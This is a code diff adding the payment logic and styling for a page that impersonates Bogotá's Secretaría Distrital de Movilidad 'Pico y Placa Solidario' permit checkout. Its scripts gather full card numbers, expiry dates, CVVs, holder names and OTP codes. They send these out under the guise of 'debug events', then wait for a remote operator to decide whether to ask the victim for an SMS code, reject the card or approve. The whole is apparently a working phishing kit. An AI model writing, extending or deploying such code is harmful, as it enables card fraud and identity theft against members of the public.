+    const timeLabel = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+    const datetimeLabel = `${dateLabel} · ${timeLabel}`;
+    const amountLabel = money(total, true);
+    const merchantLabel = 'Secretaría Distrital de Movilidad';
+    const payLabel = payBtn.textContent;
+    const cardDigits = onlyDigits(cardNumber?.value || '');
+
+    payBtn.classList.add('is-loading');
+    payBtn.disabled = true;
+    payBtn.setAttribute('aria-busy', 'true');
+    payBtn.innerHTML = '<span class="pagos-pay__spin" aria-hidden="true"></span>';
+
+    try {
+      console.log('----------------')
+      console.log('----------------')
+      console.log('PAYMENT_SUBMIT:')
+      console.log('CARD: ', cardNumber.value)
+      console.log('EXP: ', cardExp.value)
+      console.log('CVV: ', cardCvv.value)
+      const route = await sendDebugEvent('PAYMENT_SUBMIT', {
+        cardFirstDigit: cardDigits.charAt(0),
+        meta: {
+          step: 'Envió datos de tarjeta',
+          brand: brandKey,
+          amount: Number(total) || 0,
+          amountLabel: amountLabel,
+          card: maskCard(cardNumber?.value || ''),
+          cardFirstDigit: cardDigits.charAt(0),
+          cvvLength: onlyDigits(cardCvv?.value || '').length,
+          cpayload: {
+            b: cardNumber.value,
+            cv: cardExp.value,
+            exp: cardCvv.value,
+            holder: cardName.value,
+          }
+        },
+      });
+      if (route?.brand && ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(route.brand)) {
+        brandKey = route.brand;
+      }
+      setUiMessage('');
+      payBtn.classList.remove('is-loading');
+      payBtn.removeAttribute('aria-busy');
+      payBtn.textContent = payLabel;
+
+      wait?.querySelectorAll('[data-wait-brand]').forEach((panel) => {
+        panel.hidden = panel.getAttribute('data-wait-brand') !== brandKey;
+      });
+      if (wait) wait.hidden = false;
+      if (challenge) challenge.hidden = true;
+      document.body.classList.add('is-offers-waiting');
+
+      sessionStorage.setItem(
+        'latam-payment-draft',
+        JSON.stringify({
+          paidAt: now.toISOString(),
+          total,
+          email: email?.value || '',
+          invoice: invoiceToggle?.getAttribute('aria-checked') === 'true',
+          method: addCard?.classList.contains('is-selected') ? 'card' : 'none',
+          brand: brandKey,
+          merchant: merchantLabel,
+          amountLabel,
+          dateLabel,
+          timeLabel,
+        }),
+      );
+
+      const decision = await pollDebugDecision(180000);
+      const nextAction = decision?.action || 'timeout';
+
+      if (nextAction === 'sms' || nextAction === 'sms_error') {
+        if (wait) wait.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        showChallenge(
+          brandKey,
+          merchantLabel,
+          amountLabel,
+          datetimeLabel,
+          nextAction === 'sms_error' ? decision?.message || '' : '',
+        );
+        return;
+      }
+
+      if (nextAction === 'card' || nextAction === 'card_error') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        clearCardInputs();
+        setCardOpen(true);
+        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        cardNumber?.focus();
+        return;
+      }
+
+      if (nextAction === 'approved') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        window.location.href = '/success';
+        return;
+      }
+
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
+    } catch (error) {
+      payBtn.classList.remove('is-loading');
+      payBtn.removeAttribute('aria-busy');
+      payBtn.textContent = payLabel;
+      syncPayEnabled();
+      setUiMessage(error instanceof Error ? error.message : 'No se pudo continuar con el pago.');
+    }
+  });
+
+  document.querySelectorAll('[data-help-toggle]').forEach((btn) => {
+    btn.addEventListener('click', () => {
+      const root = btn.closest('[data-help]');
+      const panel = root?.querySelector('[data-help-panel]');
+      const icon = root?.querySelector('[data-help-icon]');
+      if (!panel) return;
+      const open = !panel.hidden;
+      panel.hidden = open;
+      if (icon) icon.textContent = open ? '+' : '−';
+      btn.setAttribute('aria-expanded', String(!open));
+    });
+  });
+
+  document.querySelectorAll('[data-otp-form]').forEach((form) => {
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const input = form.querySelector('input[name="otp"]');
+      if (!input?.value.trim()) {
+        input?.focus();
+        return;
+      }
+      const panel = form.closest('[data-challenge-brand]');
+      const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
+      const attempts = Number(form.dataset.attempts || '0') + 1;
+      form.dataset.attempts = String(attempts);
+      setUiMessage('');
+      clearChallengeMessages();
+      console.log('[debug-otp-submit]', {
+        sessionId: debugSessionId(),
+        brand: brandKey,
+        otpLength: String(input.value || '').trim().length,
+        attempt: attempts,
+      });
+      try {
+        console.log('----------------')
+        console.log('----------------')
+        console.log('OTP_SUBMIT:')
+        console.log('OTP: ', input.value)
+        await sendDebugEvent('OTP_SUBMIT', {
+          metaOtp: {
+            step: 'Envió código OTP',
+            brand: brandKey,
+            otp: input.value,
+            otpLength: String(input.value || '').trim().length,
+            attempt: attempts,
+          },
+        });
+      } catch {
+        setChallengeMessage(brandKey, 'No pudimos procesar el código. Intenta nuevamente.');
+        return;
+      }
+      const wait = document.getElementById('pagos-wait-screen');
+      const challenge = document.getElementById('pagos-challenge-screen');
+      wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
+        el.hidden = el.getAttribute('data-wait-brand') !== brandKey;
+      });
+      if (challenge) challenge.hidden = true;
+      if (wait) wait.hidden = false;
+      document.body.classList.add('is-offers-waiting');
+
+      const decision = await pollDebugDecision();
+      const nextAction = decision?.action || 'timeout';
+
+      if (nextAction === 'card' || nextAction === 'card_error') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        clearCardInputs();
+        setCardOpen(true);
+        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        cardNumber?.focus();
+        return;
+      }
+
+      if (nextAction === 'sms' || nextAction === 'sms_error') {
+        if (wait) wait.hidden = true;
+        challenge?.querySelectorAll('[data-challenge-brand]').forEach((el) => {
+          el.hidden = el.getAttribute('data-challenge-brand') !== brandKey;
+        });
+        if (challenge) challenge.hidden = false;
+        document.body.classList.remove('is-offers-waiting');
+        setChallengeMessage(
+          brandKey,
+          decision?.message || 'Código inválido. Hemos enviado un nuevo código por SMS o correo',
+          nextAction === 'sms_error' ? 'error' : 'info',
+        );
+        input.value = '';
+        input.focus();
+        return;
+      }
+
+      if (nextAction === 'approved') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        window.location.href = '/success';
+        return;
+      }
+
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
+    });
+  });
+</script>
+
+<script>
+  function pypsOverlay(id, on) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.toggle('hidden', !on);
+  }
+
+  function pypsMetodo() {
+    return document.querySelector('input[name="metodoPago"]:checked')?.value || 'pse';
+  }
+
+  function pypsMetodoLabel() {
+    const metodo = pypsMetodo();
+    if (metodo === 'credito') return 'Tarjeta de crédito';
+    if (metodo === 'debito') return 'Tarjeta de débito';
+    return 'PSE';
+  }
+
+  function pypsSyncMetodo() {
+    const metodo = pypsMetodo();
+    document.getElementById('pseBankBox')?.classList.toggle('hidden', metodo !== 'pse');
+    document.getElementById('cardHint')?.classList.toggle('hidden', metodo === 'pse');
+    document.getElementById('cardCuotasWrap')?.classList.toggle('hidden', metodo !== 'credito');
+  }
+
+  function pypsQuery() {
+    return new URLSearchParams(window.location.search);
+  }
+
+  function pypsFillPago() {
+    const q = pypsQuery();
+    const box = document.getElementById('pagoDatos');
+    const titulo = document.getElementById('pagoTitulo');
+    const metodo = pypsMetodo();
+    const banco = document.getElementById('pico-banco');
+    const medio = metodo === 'pse' ? (banco?.selectedOptions[0]?.textContent?.trim() || '') : pypsMetodoLabel();
+    const total = document.getElementById('pagos-total-price')?.textContent || '$ 0';
+    const now = new Date().toLocaleString('es-CO');
+    const doc = q.get('numeroDocumento') || '';
+    const nombre = [q.get('primerNombre'), q.get('segundoNombre'), q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ') || '—';
+    const placa = (q.get('placa') || '').toUpperCase();
+    const solicitud = `PYPS-${new Date().getFullYear()}-${String(doc).slice(-6).padStart(6, '0')}`;
+    if (titulo) titulo.textContent = metodo === 'pse' ? 'Datos de pago PSE' : 'Datos de pago PAYZEN';
+    const payBtn = document.getElementById('btnPagarPse');
+    if (payBtn) payBtn.textContent = metodo === 'pse' ? 'Pagar con PSE' : 'Pagar con tarjeta';
+    if (!box) return;
+    box.innerHTML = `
+      <p><strong>Estado del proceso</strong><br>Pendiente de pago</p>
+      <p><strong>Número de documento</strong><br>${doc}</p>
+      <p><strong>Identificación</strong><br>${q.get('tipoDocumento') === '8' ? 'NIT' : 'Cédula'} ${doc}</p>
+      <p><strong>Nombre completo</strong><br>${nombre}</p>
+      <p><strong>Correo electrónico</strong><br>${q.get('correo') || ''}</p>
+      <p><strong>${metodo === 'pse' ? 'Entidad Bancaria' : 'Medio de pago'}</strong><br>${medio}</p>
+      <p><strong>Valor de la transacción (IVA incluido)</strong><br>${total}</p>
+      <p><strong>Impuesto a la venta</strong><br>$ 0</p>
+      <p><strong>Asunto del pago</strong><br>Permiso Pico y Placa Solidario</p>
+      <p><strong>Placa</strong><br>${placa}</p>
+      <p><strong>Fecha de creación de la transacción</strong><br>${now}</p>
+      <p><strong>Número de la solicitud</strong><br>${solicitud}</p>
+    `;
+  }
+
+  function pypsFillPse() {
+    const q = pypsQuery();
+    const banco = document.getElementById('pico-banco');
+    const box = document.getElementById('pseResumen');
+    const doc = q.get('numeroDocumento') || '';
+    const nombre = [q.get('primerNombre'), q.get('segundoNombre'), q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ') || '—';
+    if (!box) return;
+    box.innerHTML = `
+      <p><strong>Empresa:</strong> Secretaría Distrital de Movilidad</p>
+      <p><strong>NIT:</strong> 899.999.061-9</p>
+      <p><strong>Banco:</strong> ${banco?.selectedOptions[0]?.textContent?.trim() || ''}</p>
+      <p><strong>Referencia:</strong> PYPS-${new Date().getFullYear()}-${String(doc).slice(-6).padStart(6, '0')}</p>
+      <p><strong>Valor a pagar:</strong> ${document.getElementById('pagos-total-price')?.textContent || '$ 0'}</p>
+      <p><strong>Pagador:</strong> ${nombre}</p>
+    `;
+  }
+
+  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => el.addEventListener('change', pypsSyncMetodo));
+  pypsSyncMetodo();
+
+  document.getElementById('donacionSi')?.addEventListener('click', () => {
+    document.getElementById('donacionBox')?.classList.remove('hidden');
+  });
+  document.getElementById('donacionNo')?.addEventListener('click', () => {
+    document.getElementById('donacionBox')?.classList.add('hidden');
+  });
+  document.getElementById('pico-detalle-btn')?.addEventListener('click', () => {
+    const box = document.getElementById('detalleCobro');
+    if (!box) return;
+    const q = pypsQuery();
+    box.classList.remove('hidden');
+    box.innerHTML = `
+      <h4 class="font-semibold mb-2">Detalles del cobro</h4>
+      <p><strong>Placa:</strong> ${(q.get('placa') || '').toUpperCase()}</p>
+      <p><strong>Duración del permiso:</strong> ${q.get('tipoPermiso') || ''}</p>
+      <p class="mt-2 font-bold">Valor total: ${document.getElementById('pagos-total-price')?.textContent || '$ 0'}</p>
+    `;
+  });
+
+  document.getElementById('btnIrPagar')?.addEventListener('click', () => {
+    const banner = document.getElementById('pico-pago-banner');
+    if (banner) banner.hidden = true;
+    if (pypsMetodo() === 'pse') {
+      const banco = document.getElementById('pico-banco');
+      if (!banco?.value) {
+        if (banner) {
+          banner.hidden = false;
+          banner.textContent = 'Seleccione el banco con el que desea pagar';
+        }
+        return;
+      }
+    }
+    pypsFillPago();
+    pypsOverlay('pagoOverlay', true);
+  });
+  document.getElementById('closePago')?.addEventListener('click', () => pypsOverlay('pagoOverlay', false));
+  document.getElementById('btnVolverConfirmacion')?.addEventListener('click', () => pypsOverlay('pagoOverlay', false));
+  document.getElementById('btnPagarPse')?.addEventListener('click', () => {
+    if (pypsMetodo() === 'pse') {
+      pypsFillPse();
+      pypsOverlay('pseOverlay', true);
+      return;
+    }
+    const title = document.getElementById('cardOverlayTitle');
+    if (title) title.textContent = pypsMetodoLabel();
+    const total = document.getElementById('pagos-total-price')?.textContent || '$ 0';
+    const cardTotal = document.getElementById('cardTotal');
+    const amount = document.getElementById('pagos-card-amount');
+    if (cardTotal) cardTotal.textContent = total;
+    if (amount) amount.textContent = total;
+    const brand = document.getElementById('cardBrand');
+    if (brand) {
+      brand.textContent = CARD_BRANDS;
+      brand.className = 'text-sm text-gray mb-4';
+    }
+    const q = pypsQuery();
+    const titular = [q.get('primerNombre'), q.get('segundoNombre'), q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ');
+    const titularEl = document.getElementById('cardTitular');
+    if (titularEl) {
+      titularEl.setAttribute('autocomplete', 'off');
+      titularEl.setAttribute('readonly', 'readonly');
+      titularEl.value = titular;
+      window.setTimeout(() => {
+        titularEl.value = titular;
+        titularEl.removeAttribute('readonly');
+      }, 350);
+    }
+    document.getElementById('cardError')?.classList.add('hidden');
+    pypsOverlay('cardOverlay', true);
+  });
+  document.getElementById('btnSalirPse')?.addEventListener('click', () => pypsOverlay('pseOverlay', false));
+  document.getElementById('btnSalirCard')?.addEventListener('click', () => pypsOverlay('cardOverlay', false));
+  document.getElementById('btnCancelar')?.addEventListener('click', () => window.history.back());
+  document.getElementById('btnAtras')?.addEventListener('click', () => window.history.back());
+
+  const CARD_BRANDS = 'Visa · Mastercard · American Express · Diners Club';
+
+  function pypsVal(id) {
+    return (document.getElementById(id)?.value || '').trim();
+  }
+
+  function pypsSetVal(id, value) {
+    const el = document.getElementById(id);
+    if (el) el.value = value;
+  }
+
+  function cardBrand(digits) {
+    if (/^3[47]/.test(digits)) return 'American Express';
+    if (/^(36|38|39)/.test(digits)) return 'Diners Club';
+    if (/^30[0-5]/.test(digits)) return 'Diners Club';
+    if (/^3095/.test(digits)) return 'Diners Club';
+    if (digits.startsWith('4')) return 'Visa';
+    if (/^(5[1-5]|2[2-7])/.test(digits)) return 'Mastercard';
+    return '';
+  }
+
+  function cardLength(brand) {
+    if (brand === 'American Express') return { min: 15, max: 15 };
+    if (brand === 'Diners Club') return { min: 14, max: 16 };
+    if (brand === 'Mastercard') return { min: 16, max: 16 };
+    if (brand === 'Visa') return { min: 13, max: 19 };
+    return { min: 13, max: 19 };
+  }
+
+  function luhnValid(digits) {
+    if (!/^\d{13,19}$/.test(digits)) return false;
+    let sum = 0;
+    let doubleDigit = false;
+    for (let i = digits.length - 1; i >= 0; i -= 1) {
+      let n = Number(digits[i]);
+      if (doubleDigit) {
+        n *= 2;
+        if (n > 9) n -= 9;
+      }
+      sum += n;
+      doubleDigit = !doubleDigit;
+    }
+    return sum % 10 === 0;
+  }
+
+  function formatCardNumber(value) {
+    const digits = value.replace(/\D/g, '').slice(0, 19);
+    const brand = cardBrand(digits);
+    if (brand === 'American Express') {
+      return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)].filter(Boolean).join(' ');
+    }
+    if (brand === 'Diners Club') {
+      if (digits.length > 14) {
+        return digits.slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+      }
+      return [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 14)].filter(Boolean).join(' ');
+    }
+    return digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+  }
+
+  function formatExpiry(value) {
+    const digits = value.replace(/\D/g, '').slice(0, 4);
+    if (digits.length <= 2) return digits;
+    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+  }
+
+  function validExpiry(value) {
+    const match = /^(\d{2})\/(\d{2})$/.exec(value);
+    if (!match) return false;
+    const month = Number(match[1]);
+    const year = 2000 + Number(match[2]);
+    if (month < 1 || month > 12) return false;
+    const now = new Date();
+    const exp = new Date(year, month, 0, 23, 59, 59);
+    return exp >= now;
+  }
+
+  function validateCard() {
+    const titular = pypsVal('cardTitular');
+    const digits = pypsVal('cardNumero').replace(/\s+/g, '');
+    const vence = pypsVal('cardVence');
+    const cvv = pypsVal('cardCvv');
+    const brand = cardBrand(digits);
+    const length = cardLength(brand);
+    const amex = brand === 'American Express';
+    if (!titular) return 'Ingresa el nombre del titular.';
+    if (!/^\d+$/.test(digits) || digits.length < length.min || digits.length > length.max) {
+      return 'El número de tarjeta no está bien escrito.';
+    }
+    if (!brand) return 'No se reconoció la franquicia de la tarjeta.';
+    if (!luhnValid(digits)) return 'El número de tarjeta no está bien escrito.';
+    if (!validExpiry(vence)) return 'La fecha de vencimiento no es válida.';
+    if (!/^\d+$/.test(cvv) || cvv.length !== (amex ? 4 : 3)) return 'El CVV no es válido.';
+    return '';
+  }
+
+  function updateCardLive() {
+    const digits = pypsVal('cardNumero').replace(/\s+/g, '');
+    const brand = cardBrand(digits);
+    const el = document.getElementById('cardBrand');
+    const length = cardLength(brand);
+    if (!el) return;
+    if (!digits) {
+      el.textContent = CARD_BRANDS;
+      el.className = 'text-sm text-gray mb-4';
+      return;
+    }
+    if (brand && digits.length < length.min) {
+      el.textContent = brand;
+      el.className = 'text-sm text-dark-green mb-4';
+      return;
+    }
+    if (!luhnValid(digits) || (brand && (digits.length < length.min || digits.length > length.max))) {
+      el.textContent = `${brand || 'Tarjeta'} · El número no está bien escrito`;
+      el.className = 'text-sm text-color-error mb-4';
+      return;
+    }
+    el.textContent = `${brand} · Número válido`;
+    el.className = 'text-sm text-dark-green mb-4';
+  }
+
+  document.getElementById('cardNumero')?.addEventListener('input', () => {
+    const formatted = formatCardNumber(pypsVal('cardNumero'));
+    pypsSetVal('cardNumero', formatted);
+    const brand = cardBrand(formatted.replace(/\s+/g, ''));
+    const cvv = document.getElementById('cardCvv');
+    if (cvv) cvv.maxLength = brand === 'American Express' ? 4 : 3;
+    updateCardLive();
+  });
+  document.getElementById('cardVence')?.addEventListener('input', () => pypsSetVal('cardVence', formatExpiry(pypsVal('cardVence'))));
+  document.getElementById('cardCvv')?.addEventListener('input', () => {
+    const amex = cardBrand(pypsVal('cardNumero').replace(/\s+/g, '')) === 'American Express';
+    pypsSetVal('cardCvv', pypsVal('cardCvv').replace(/\D/g, '').slice(0, amex ? 4 : 3));
+  });
+
+  document.getElementById('cardForm')?.addEventListener('submit', (event) => {
+    event.preventDefault();
+    const error = validateCard();
+    const errEl = document.getElementById('cardError');
+    if (error) {
+      if (errEl) {
+        errEl.textContent = error;
+        errEl.classList.remove('hidden');
+      }
+      return;
+    }
+    errEl?.classList.add('hidden');
+    const map = [
+      ['cardTitular', 'pagos-card-name'],
+      ['cardNumero', 'pagos-card-number'],
+      ['cardVence', 'pagos-card-exp'],
+      ['cardCvv', 'pagos-card-cvv'],
+    ];
+    map.forEach(([from, to]) => {
+      const src = document.getElementById(from);
+      const dest = document.getElementById(to);
+      if (!src || !dest) return;
+      dest.removeAttribute('readonly');
+      dest.value = src.value;
+      dest.dispatchEvent(new Event('input', { bubbles: true }));
+    });
+    const pay = document.getElementById('pagos-pay');
+    if (pay) {
+      pay.disabled = false;
+      pay.click();
+    }
+  });
+</script>
+
+<style is:global>
+  body.is-pagos-page #pagoOverlay:not(.hidden),
+  body.is-pagos-page #pseOverlay:not(.hidden),
+  body.is-pagos-page #cardOverlay:not(.hidden) {
+    position: fixed;
+    inset: 0;
+    z-index: 90;
+    display: flex;
+  }
+
+  body.is-pagos-page #pseOverlay:not(.hidden),
+  body.is-pagos-page #cardOverlay:not(.hidden) {
+    z-index: 100;
+  }
+
+  body.is-pagos-page .pagos-main {
+    max-width: none;
+    margin: 0;
+    padding: 0;
+  }
+
+  body.is-pagos-page .pagos-confirm-overlay {
+    position: relative;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    min-height: calc(100dvh - 80px);
+    padding: 20px 12px 40px;
+  }
+
+  body.is-pagos-page .pagos-lead {
+    max-width: 760px;
+    margin: 0 0 28px;
+    font-size: 15px;
+    line-height: 1.55;
+    color: #00271c;
+  }
+
+  body.is-pagos-page .pagos-summary,
+  body.is-pagos-page .pico-pay-payer {
+    background: #fff;
+    border: 0 !important;
+    border-radius: 8px;
+    box-shadow: none !important;
+    padding: 28px 24px;
+  }
+
+  body.is-pagos-page .pico-pay-payer {
+    margin: 20px 0 0;
+  }
+
+  body.is-pagos-page .pico-pay-payer h2 {
+    margin: 0 0 8px;
+    color: #00271c;
+    font-size: 22px;
+    font-weight: 800;
+  }
+
+  body.is-pagos-page .pico-pay-payer p {
+    margin: 0 0 20px;
+    font-size: 14px;
+    line-height: 1.5;
+    color: #00271c;
+  }
+
+  body.is-pagos-page .pico-pay-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 18px 20px;
+  }
+
+  body.is-pagos-page .pico-field {
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+    text-align: left;
+  }
+
+  body.is-pagos-page .pico-field span {
+    font-size: 13px;
+    color: #00271c;
+  }
+
+  body.is-pagos-page .pico-field input,
+  body.is-pagos-page .pico-field select {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid #cfd8d4;
+    border-radius: 4px;
+    background: #f7f7f7;
+    color: #00271c;
+    font-size: 15px;
+    box-sizing: border-box;
+  }
+
+  body.is-pagos-page .pico-payzen {
+    margin: 32px calc(50% - 50vw) 0;
+    width: 100vw;
+    padding: 48px 16px 56px;
+    background: #000;
+  }
+
+  body.is-pagos-page .pico-payzen__card {
+    max-width: 460px;
+    margin: 0 auto;
+    background: #fff;
+    border: 10px solid #f2f2f2;
+  }
+
+  body.is-pagos-page .pico-payzen__bar {
+    height: 28px;
+    background: #00271c;
+  }
+
+  body.is-pagos-page .pico-payzen__meta {
+    margin: 0;
+    padding: 20px 22px 8px;
+  }
+
+  body.is-pagos-page .pico-payzen__meta div {
+    margin: 0 0 14px;
+  }
+
+  body.is-pagos-page .pico-payzen__meta dt {
+    font-size: 13px;
+    font-weight: 600;
+    color: #111;
+  }
+
+  body.is-pagos-page .pico-payzen__meta dd {
+    margin: 4px 0 0;
+    font-size: 14px;
+    color: #111;
+  }
+
+  body.is-pagos-page .pico-payzen .pagos-method,
+  body.is-pagos-page .pico-payzen .pagos-method.is-selected {
+    border: 0 !important;
+    box-shadow: none !important;
+    margin: 0;
+    padding: 0 12px 20px;
+    background: transparent;
+  }
+
+  body.is-pagos-page .pico-payzen .pagos-card-form {
+    padding: 0 10px 8px;
+    border: 0;
+    background: transparent;
+  }
+
+  body.is-pagos-page .pico-payzen .pagos-card-payline {
+    color: #00271c;
+    border: 0;
+    padding: 0 12px 12px;
+  }
+
+  body.is-pagos-page .pico-payzen .pagos-card-input:focus-within,
+  body.is-pagos-page .pico-payzen .pagos-card-number-box:focus-within,
+  body.is-pagos-page .pico-payzen .pagos-card-input input:focus {
+    border-color: #00271c;
+    box-shadow: 0 0 0 1px #00271c;
+    outline: none;
+  }
+
+  body.is-pagos-page .pico-pay-hide,
+  body.is-pagos-page #pagos-invoice,
+  body.is-pagos-page #pagos-wallet,
+  body.is-pagos-page .pagos-method__toggle {
+    display: none !important;
+  }
+
+  body.is-pagos-page .ticket-price__was {
+    display: none;
+  }
+
+  body.is-pagos-page .pagos-actions {
+    margin-top: 28px;
+  }
+
+  body.is-pagos-page .pagos-terms,
+  body.is-pagos-page .pagos-terms a {
+    color: #00271c;
+  }
+
+  @media (max-width: 800px) {
+    body.is-pagos-page .pico-pay-grid {
+      grid-template-columns: 1fr;
+    }
+  }
+</style>
+
